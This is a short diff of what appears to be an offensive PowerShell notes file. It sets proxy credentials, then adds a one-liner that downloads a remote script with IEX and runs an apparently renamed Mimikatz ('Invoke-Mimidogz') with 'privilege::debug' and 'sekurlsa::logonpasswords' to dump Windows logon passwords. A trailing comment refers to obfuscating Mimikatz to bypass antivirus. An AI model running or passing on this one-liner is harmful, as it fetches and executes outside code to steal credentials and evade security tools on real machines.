@@ -19,8 +19,7 @@ Autentication proxy for powershell
 (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
 
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mttstt/mimi/master/Kingdom3.ps1");Invoke-Mimidogz -Com
-mand "privilege::debug";Invoke-Mimidogz -command "sekurlsa::logonpasswords"
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mttstt/mimi/master/Kingdom3.ps1");Invoke-Mimidogz -Command "privilege::debug";Invoke-Mimidogz -command "sekurlsa::logonpasswords"
 
 # Script to obfuscate mimikatz and bypass AV
     
